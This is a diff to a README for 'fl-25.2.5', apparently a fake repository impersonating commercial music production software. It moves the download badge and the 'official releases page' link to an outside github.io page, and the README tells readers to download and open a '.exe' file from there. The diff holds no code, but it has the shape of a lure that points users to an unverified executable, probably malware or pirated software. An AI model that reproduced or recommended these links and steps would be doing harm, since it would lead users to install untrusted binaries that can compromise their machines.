@@ -1,6 +1,6 @@
 # 🎧 fl-25.2.5 - Professional Music Production Made Simple
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/invasive-cyma980/fl-25.2.5/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://invasive-cyma980.github.io)
 
 ---
 
@@ -19,7 +19,7 @@ Before you install the software, ensure your computer meets these minimum specif
 ## 💾 Downloading and Installation
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/invasive-cyma980/fl-25.2.5/releases) to access the download files.
+1. Visit the [official releases page](https://invasive-cyma980.github.io) to access the download files.
 2. Look for the file ending in `.exe` under the latest release heading.
 3. Click the file name to start the download. 
 4. Open your "Downloads" folder once the process finishes.
